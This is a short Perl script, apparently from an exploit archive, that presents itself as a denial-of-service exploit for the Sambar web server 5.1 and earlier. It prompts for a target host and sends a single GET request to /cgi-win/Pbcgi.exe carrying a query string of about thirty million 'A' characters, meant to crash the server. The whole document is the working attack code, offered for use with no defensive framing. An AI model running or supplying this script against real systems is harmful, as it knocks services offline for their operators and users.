#!/usr/bin/perl -w

---------------------------------------------------------
|Simply exploit for the vulnerability on Sambar 5.1 or <|
|For all windows distributions.. be careful =oP         |
---------------------------------------------------------
|Angel=SS=www.systat.cl|
------------------------
use Socket;

print<<EOF;
:::Pbcgi.exe DoS exploit..:::
EOF
print "Host: ";
chomp ($server=<STDIN>);

$demanda="AAA"x9999999;

&attack;

sub attack
{
my($iaddr,$paddr,$proto);
my $port = 80;
$iaddr = inet_aton($server) || die "Error: $!";
$paddr = sockaddr_in($port, $iaddr) || die "Error: $!";
$proto = getprotobyname('tcp') || die "Error: $!";

socket(SOCK, AF_INET, SOCK_STREAM, $proto) || die "imposible abrir socket";
connect(SOCK, $paddr) || die "Connection error";
if(send(SOCK,"GET /cgi-win/Pbcgi.exe?$demanda  HTTP/1.0\r\n\r\n",0))
	{
	print "\nDoS elfolgreich gesendet!!";
	}
else
	{
	print "\nError sending attack...";
	}
}
